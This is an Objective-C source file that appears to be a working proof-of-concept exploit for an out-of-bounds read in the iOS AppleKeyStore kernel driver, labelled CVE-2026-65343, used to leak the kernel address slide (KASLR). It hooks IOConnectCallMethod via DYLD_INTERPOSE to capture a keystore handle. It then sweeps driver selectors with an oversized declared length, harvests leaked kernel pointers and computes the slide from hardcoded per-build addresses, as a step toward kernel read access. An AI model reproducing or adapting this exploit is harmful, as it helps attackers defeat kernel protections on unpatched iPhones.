//
//  P182AKSKaslrOob.m -- CVE-2026-65343: the AppleKeyStore ACM deserialize OOB
//  read -> KASLR. Byte-proven LIVE on 23F77/26.5 (findings 2026-11-24:
//  the 26.6.1 fix's `remaining >=` assert family exists on 26.7.1 and is
//  ABSENT on 26.5; the deserialize bodies are otherwise code-identical).
//
//  ROUTE (the PoC's, translated -- no entitlement, no direct-open assumption):
//    A. DYLD_INTERPOSE on IOConnectCallMethod (the __DATA,__interpose section
//       is writable in OUR binary and dyld processes it at load, before
//       __DATA_CONST locks -- fishhook is dead on iOS 26, interpose is not).
//       Arm the capture, create+sign a Secure Enclave key IN-PROCESS
//       (Security.framework's own IOConnectCallMethod fires) -> capture the
//       AKS (conn, ACMHandle[16]). SE keys are a PUBLIC API -- no entitlement.
//    B. Sweep AKS selectors 1..163 with struct_in = {handle[16], 0, 0,
//       declared_length=0x800 at +24}. The pre-fix deserialize publishes
//       (payload_ptr, declared_length) without `declared <= remaining` ->
//       the driver copyout reads ~0x7E8 bytes PAST the kernel ACM message
//       buffer -> adjacent kernel heap lands in our output.
//    C. Scan for kernel-band qwords (0xfffffff0>>36 / 0xfffffe<<32 class) ->
//       the kptr list + the slide CONSENSUS against the 23F77 static pin
//       table (a vtable/static pointer = static_va + slide; two kptrs
//       agreeing on one page-aligned delta = the slide).
//    D. Fallback if the capture misses: direct IOServiceOpen("AppleKeyStore")
//       + zero-handle sweep (honest row if the sandbox denies the lookup).
//
//  HONESTY: a KASLR leak is NOT hasKread (the gate stays
//  kread32(kbase)==0xfeedfacf via board commitSlide). READ-ONLY copyout OOB,
//  no frees, no races -- PANIC-FREE. KEYS ONLY from entitlements; no keys
//  involved here at all. Log p182_aks_kaslr_log.txt. One tap per app run.
//

#import "P182AKSKaslrOob.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>

#ifndef P182_BUILD
#define P182_BUILD @"p182-aks-kaslr-oob-v1"
#endif

/* ── IOKit (dlsym'd -- the house pattern; iOS apps do not link IOKit) ── */
typedef mach_port_t io_obj_t;
typedef void *(*p182_matching_t)(const char *);   /* CFMutableDictionaryRef */
typedef io_obj_t (*p182_getsvc_t)(mach_port_t, void *);
typedef kern_return_t (*p182_open_t)(io_obj_t, mach_port_t, uint32_t, io_obj_t *);
typedef kern_return_t (*p182_close_t)(io_obj_t);
typedef kern_return_t (*p182_method_t)(
    io_obj_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

/* the interpose REPLACEE: weak-extern so the link emits an undefined-weak
   symbol dyld resolves from the cache; if interpose processing applies, our
   hook sees every IOConnectCallMethod in the process. */
extern kern_return_t IOConnectCallMethod(
    io_obj_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt)
    __attribute__((weak));

#ifndef DYLD_INTERPOSE
#define DYLD_INTERPOSE(_replacement, _replacee)                          \
    __attribute__((used))                                                 \
    static struct { const void *replacement; const void *replacee; }     \
    _interpose_##_replaceee                                               \
    __attribute__((section("__DATA,__interpose"))) = {                   \
        (const void *)(unsigned long)&(_replacement),                     \
        (const void *)(unsigned long)&(_replacee)                         \
    };
#endif

/* ── capture state ── */
static volatile int g_p182_armed = 0;
static volatile int g_p182_done = 0;
static volatile io_obj_t g_p182_conn = 0;
static uint8_t g_p182_handle[16];

static kern_return_t p182_real_method(
    io_obj_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt)
{
    static p182_method_t fn = NULL;
    if (!fn) fn = (p182_method_t)dlsym(RTLD_NEXT, "IOConnectCallMethod");
    if (!fn) return KERN_FAILURE;
    return fn(connection, selector, input, inputCnt,
              inputStruct, inputStructCnt,
              output, outputCnt, outputStruct, outputStructCnt);
}

static kern_return_t p182_hook_method(
    io_obj_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt)
{
    if (g_p182_armed && !g_p182_done && inputStruct && inputStructCnt >= 16) {
        const uint8_t *h = (const uint8_t *)inputStruct;
        int nonzero = 0;
        for (int k = 0; k < 16; k++) if (h[k]) { nonzero = 1; break; }
        if (nonzero) {
            g_p182_conn = connection;
            memcpy(g_p182_handle, h, 16);
            __asm__ volatile("dmb ish" ::: "memory");
            g_p182_done = 1;
        }
    }
    return p182_real_method(connection, selector, input, inputCnt,
                            inputStruct, inputStructCnt,
                            output, outputCnt, outputStruct, outputStructCnt);
}

DYLD_INTERPOSE(p182_hook_method, IOConnectCallMethod)

/* ── the SE key trigger (public API, no entitlement) ── */
static int p182_se_trigger(NSMutableString *o) {
    NSData *tag = [NSData dataWithBytes:"com.research.p182.aks"
                                 length:strlen("com.research.p182.aks")];
    NSDictionary *delQ = @{(id)kSecClass: (id)kSecClassKey,
                           (id)kSecAttrApplicationTag: tag};
    SecItemDelete((__bridge CFDictionaryRef)delQ);

    CFErrorRef cfErr = NULL;
    SecAccessControlRef acl = SecAccessControlCreateWithFlags(
        kCFAllocatorDefault, kSecAttrAccessibleAfterFirstUnlock, 0, &cfErr);
    if (!acl) {
        [o appendFormat:@"[se] SecAccessControlCreateWithFlags failed\n"];
        if (cfErr) CFRelease(cfErr);
        return 0;
    }
    NSDictionary *attrs = @{
        (id)kSecAttrKeyType:       (id)kSecAttrKeyTypeECSECPrimeRandom,
        (id)kSecAttrKeySizeInBits: @256,
        (id)kSecAttrTokenID:       (id)kSecAttrTokenIDSecureEnclave,
        (id)kSecAttrAccessControl: (__bridge id)acl,
        (id)kSecPrivateKeyAttrs: @{
            (id)kSecAttrIsPermanent:    @YES,
            (id)kSecAttrApplicationTag: tag,
        },
    };
    cfErr = NULL;
    SecKeyRef priv = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attrs, &cfErr);
    CFRelease(acl);
    if (!priv) {
        [o appendFormat:@"[se] SecKeyCreateRandomKey failed (%@)\n",
            cfErr ? [(__bridge NSError *)cfErr localizedDescription] : @"?"];
        if (cfErr) CFRelease(cfErr);
        return 0;
    }
    const uint8_t msg[32] = {0xDE, 0xAD, 0xBE, 0xEF};
    CFDataRef msgRef = CFDataCreate(NULL, msg, sizeof(msg));
    cfErr = NULL;
    CFDataRef sig = SecKeyCreateSignature(
        priv, kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &cfErr);
    CFRelease(msgRef);
    CFRelease(priv);
    [o appendFormat:@"[se] SE key created; sign %@\n",
        sig ? @"OK (the in-process AKS call fired)" : @"failed"];
    if (sig) { CFRelease(sig); return 1; }
    if (cfErr) CFRelease(cfErr);
    return g_p182_done ? 1 : 0;
}

static void p182_se_cleanup(void) {
    NSData *tag = [NSData dataWithBytes:"com.research.p182.aks"
                                 length:strlen("com.research.p182.aks")];
    NSDictionary *delQ = @{(id)kSecClass: (id)kSecClassKey,
                           (id)kSecAttrApplicationTag: tag};
    SecItemDelete((__bridge CFDictionaryRef)delQ);
}

/* ── kernel-band classifier (23F77 + T8150 bands) ── */
static int p182_is_kptr(uint64_t v) {
    if (!v) return 0;
    if ((v >> 36) == 0xfffffff0ULL) return 1;              /* 23F77-class band */
    if ((v >> 32) == 0xfffffe00ULL) return 1;              /* T8150-class band */
    if (v >= 0xfffffe0000000000ULL && v < 0xfffffff100000000ULL) return 1;
    return 0;
}

/* ── the 23F77 static pin table (slide candidates -- any static in the whole
   kernelcache shares ONE slide; a leaked vtable/static pointer = pin+slide) ── */
static const struct { uint64_t va; const char *nm; } p182_pins[] = {
    { 0xfffffff007004000ULL, "kernel static_base (link base)" },
    { 0xfffffff00ae6a790ULL, "STATIC_RIPCBINFO (23F77 data pin)" },
    { 0xfffffff00a60d8d0ULL, "pmap_load_trust_cache (23F77 text pin)" },
    { 0xfffffff008b673f8ULL, "AMFI UC (23F77 text pin)" },
};

@implementation P182AKSKaslrOob

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p182_aks_kaslr_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p182 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P182_BUILD]);
    L(@"CVE-2026-65343 -- the AKS ACM deserialize OOB read -> KASLR.");
    L(@"Byte-proven LIVE on 23F77 (findings 2026-11-24: 26.5 lacks the entire");
    L(@"`remaining >=` assert family that 26.7.1 carries). READ-ONLY copyout");
    L(@"OOB -- PANIC-FREE. A KASLR leak is NOT hasKread; the gate stays");
    L(@"kread32(kbase)==0xfeedfacf via board commitSlide.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!h) h = RTLD_DEFAULT;
    p182_matching_t matching = (p182_matching_t)dlsym(h, "IOServiceMatching");
    p182_getsvc_t getsvc = (p182_getsvc_t)dlsym(h, "IOServiceGetMatchingService");
    p182_open_t opener = (p182_open_t)dlsym(h, "IOServiceOpen");
    p182_close_t closer = (p182_close_t)dlsym(h, "IOServiceClose");
    L([NSString stringWithFormat:@"[lib] iokit=%@ matching=%@ getsvc=%@ open=%@ close=%@",
       h ? @"ok" : @"nil", matching ? @"1" : @"0", getsvc ? @"1" : @"0",
       opener ? @"1" : @"0", closer ? @"1" : @"0"]);
    if (!matching || !getsvc || !opener) {
        L(@"[-] IOKit symbols unresolved -- tap void");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── A: the interpose capture (SE key path) ── */
    L(@"");
    L(@"=== A: DYLD_INTERPOSE capture via the SE key path ===");
    g_p182_armed = 0;
    g_p182_done = 0;
    g_p182_conn = 0;
    memset(g_p182_handle, 0, sizeof g_p182_handle);
    __asm__ volatile("dmb ish" ::: "memory");
    g_p182_armed = 1;
    __asm__ volatile("dmb ish" ::: "memory");
    NSMutableString *seOut = [NSMutableString string];
    int seOk = p182_se_trigger(seOut);
    L(seOut);
    __asm__ volatile("dmb ish" ::: "memory");
    g_p182_armed = 0;
    p182_se_cleanup();

    io_obj_t conn = 0;
    uint8_t handle[16];
    memset(handle, 0, sizeof handle);
    int haveHandle = 0;
    if (g_p182_done && g_p182_conn) {
        conn = g_p182_conn;
        memcpy(handle, g_p182_handle, 16);
        haveHandle = 1;
        L([NSString stringWithFormat:
           @"[A] CAPTURE OK conn=0x%x handle=%02x%02x%02x%02x%02x%02x%02x%02x...",
           (unsigned)conn, handle[0], handle[1], handle[2], handle[3],
           handle[4], handle[5], handle[6], handle[7]]);
    } else {
        L([NSString stringWithFormat:
           @"[A] capture MISSED (se=%d done=%d conn=0x%x) -- possible causes: ",
           seOk, g_p182_done, (unsigned)g_p182_conn]);
        L(@"    dyld4 closure bypassed the interpose / SE ops routed via secd");
        L(@"    XPC / SecKeyCreateRandomKey failed before the IOKit call");
    }

    /* ── B (fallback): direct open + zero handle ── */
    if (!haveHandle) {
        L(@"");
        L(@"=== B: direct IOServiceOpen(AppleKeyStore) + zero handle ===");
        void *m = matching("AppleKeyStore");
        io_obj_t svc = getsvc(0, m);
        if (!svc) {
            L(@"[B] AppleKeyStore lookup DENIED/absent (the honest sandbox row)");
        } else {
            kern_return_t kr = opener(svc, mach_task_self(), 0, &conn);
            if (kr == KERN_SUCCESS && conn) {
                L([NSString stringWithFormat:
                   @"[B] direct open OK conn=0x%x (zero-handle sweep)", (unsigned)conn]);
            } else {
                L([NSString stringWithFormat:
                   @"[B] IOServiceOpen failed kr=0x%x -- honest row", kr]);
                conn = 0;
            }
        }
    }

    if (!conn) {
        L(@"");
        L(@"=== VERDICT ===");
        L(@"[=] no AKS connection either route -- nothing to sweep. The decode");
        L(@"    receipt (findings 2026-11-24) stands; the on-device OOB waits.");
        [[P007Board shared] recordEvent:@"p182_aks_kaslr"
                                     kind:@"kaslr"
                                   detail:@"no-conn"
                                   source:@"p182"];
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── C: the selector sweep with declared_length=0x800 ── */
    L(@"");
    L([NSString stringWithFormat:@"=== C: the selector sweep (1..163, declared=0x800) ==="]);
    uint64_t kptrs[256];
    int kptrN = 0;
    int selHits = 0, selOOB = 0;
    static uint8_t out[0x2000];
    for (uint32_t sel = 1; sel <= 163; sel++) {
        uint8_t msg[28];
        memset(msg, 0, sizeof msg);
        memcpy(msg, handle, 16);
        uint32_t decl = 0x800;
        memcpy(msg + 24, &decl, 4);
        memset(out, 0xBB, sizeof out);
        size_t outsz = sizeof out;
        uint64_t sc[8] = {0};
        uint32_t scn = 8;
        kern_return_t kr = p182_real_method(
            conn, sel, NULL, 0, msg, sizeof msg, sc, &scn, out, &outsz);
        int nonfill = 0, kn = 0;
        uint64_t firstK = 0;
        for (size_t i = 0; i + 8 <= outsz; i += 8) {
            uint64_t v = 0;
            memcpy(&v, out + i, 8);
            if (v != 0xBBBBBBBBBBBBBBBBULL) nonfill++;
            if (p182_is_kptr(v)) {
                kn++;
                if (!firstK) firstK = v;
                if (kptrN < 256) {
                    int dup = 0;
                    for (int q = 0; q < kptrN; q++) if (kptrs[q] == v) { dup = 1; break; }
                    if (!dup) kptrs[kptrN++] = v;
                }
            }
        }
        if (nonfill > 0 || (outsz != sizeof out && kr == KERN_SUCCESS)) {
            selHits++;
            int oob = (outsz >= 0x800 && outsz > 0x100);
            if (oob) selOOB++;
            if (selHits <= 12)
                L([NSString stringWithFormat:
                   @"[C] sel=%3u kr=0x%08x outsz=%#zx nonfill=%d kptr=%d%@",
                   sel, (unsigned)kr, outsz, nonfill, kn,
                   firstK ? [NSString stringWithFormat:@" first=0x%016llx",
                              (unsigned long long)firstK] : @""]);
        }
    }
    L([NSString stringWithFormat:
       @"[C] sweep: %d selectors answered, %d oversized -- %d distinct kptrs",
       selHits, selOOB, kptrN]);

    /* ── D: the kptr list + slide consensus ── */
    L(@"");
    L(@"=== D: the kptr list + the slide consensus ===");
    for (int i = 0; i < kptrN && i < 32; i++)
        L([NSString stringWithFormat:@"[D] kptr[%d] = 0x%016llx", i,
           (unsigned long long)kptrs[i]]);
    if (kptrN > 32)
        L([NSString stringWithFormat:@"[D] %d more in the kptr table", kptrN - 32]);

    /* consensus: every static in the kernelcache shares ONE slide.
       vote[delta] over (kptr, pin) pairs with page-aligned plausible deltas. */
    uint64_t voteDelta[64]; int votes[64]; int voteN = 0;
    for (int i = 0; i < kptrN; i++) {
        for (size_t p = 0; p < sizeof(p182_pins) / sizeof(p182_pins[0]); p++) {
            uint64_t d = kptrs[i] - p182_pins[p].va;
            if (d == 0 || (d & 0x3fff)) continue;          /* 16K-page aligned */
            if (d > 0x80000000ULL) continue;               /* plausible slide */
            int found = -1;
            for (int v = 0; v < voteN; v++) if (voteDelta[v] == d) { found = v; break; }
            if (found < 0 && voteN < 64) {
                voteDelta[voteN] = d; votes[voteN] = 1; voteN++;
            } else if (found >= 0) votes[found]++;
        }
    }
    int best = -1;
    for (int v = 0; v < voteN; v++) if (best < 0 || votes[v] > votes[best]) best = v;
    if (best >= 0 && votes[best] >= 2) {
        L([NSString stringWithFormat:
           @"[D] *** SLIDE CONSENSUS: 0x%llx (%d votes) -- kbase = 0x%llx ***",
           (unsigned long long)voteDelta[best], votes[best],
           (unsigned long long)(0xfffffff007004000ULL + voteDelta[best])]);
        L(@"[D] a CONSENSUS slide is a candidate, NOT hasKread -- the gate stays");
        L(@"    kread32(kbase)==0xfeedfacf via board commitSlide.");
    } else {
        L(@"[D] no consensus this tap (heap kptrs outnumbered static/vtable");
        L(@"    refs) -- the kptr list above is the artifact; offline match it");
        L(@"    against the 23F77 Ghidra program (vtables/__DATA_CONST).");
    }

    L(@"");
    L(@"=== VERDICT ===");
    /* the 300eb56 law: plain sequential statements, no nested ternary/message arms */
    NSString *slideStr = @"none";
    if (best >= 0 && votes[best] >= 2)
        slideStr = [NSString stringWithFormat:@"0x%llx (candidate)",
                    (unsigned long long)voteDelta[best]];
    L([NSString stringWithFormat:
       @"[%@] capture=%@ sweep hits=%d oob=%d kptrs=%d slide=%@",
       @"p182", haveHandle ? @"SE-handle" : @"fallback",
       selHits, selOOB, kptrN, slideStr]);
    L(@"[=] READ-ONLY OOB receipt. hasKread stays NO -- it flips ONLY on");
    L(@"    kread32(kbase) via commitSlide.");

    [[P007Board shared] recordEvent:@"p182_aks_kaslr"
                                 kind:@"kaslr"
                               detail:[NSString stringWithFormat:
                                       @"capture=%d hits=%d kptrs=%d",
                                       haveHandle, selHits, kptrN]
                               source:@"p182"];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
